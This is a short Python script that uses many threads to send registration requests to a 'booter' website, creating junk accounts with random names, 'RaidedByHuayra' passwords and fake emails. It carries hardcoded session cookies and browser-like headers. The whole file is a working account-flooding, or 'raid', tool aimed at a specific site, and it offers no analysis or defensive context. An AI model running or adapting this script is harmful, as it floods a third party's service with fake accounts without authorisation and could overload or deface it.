from colorama import init
import threading
import requests
import random
import string
import sys
init()

try:
    threads = int(sys.argv[1])
except:
    pass

def main():
    def randomString(stringLength=12):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(stringLength))


    cookies = {
        '__cfduid': 'd602cd88a5dc4b445024663ba1bcc20581578819871',
        'PHPSESSID': '1c9141c11c562112b97d55fb415f6df8',
    }

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://booter.online',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': 'http://booter.online/register.php?',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
    }


    Username = 'SYNATII' + randomString(5)
    Password = 'RaidedByHuayra-' + randomString(4)
    Email = f'{randomString(12)}@gmail.com'

    data = {
      'username': Username,
      'password': Password,
      'email': Email,
      'registerBtn': 'Login'
    }

    response = requests.post('http://booter.online/register.php', headers=headers, cookies=cookies, data=data, verify=False)

    if response.status_code == 200:
        print(f'\n\033[32;1mAccount Successfully Created!\n\n\033[36;1mUsername\033[30;1m: \033[34;1m{Username}\n\033[36;1mPassword\033[30;1m: \033[34;1m{Password}\n\033[36;1mEmail\033[30;1m: \033[34;1m{Email}')


try:
    for x in range(threads):
        threading.Thread(target=main).start()

except Exception as e:
    print(f"Error >> {e}")

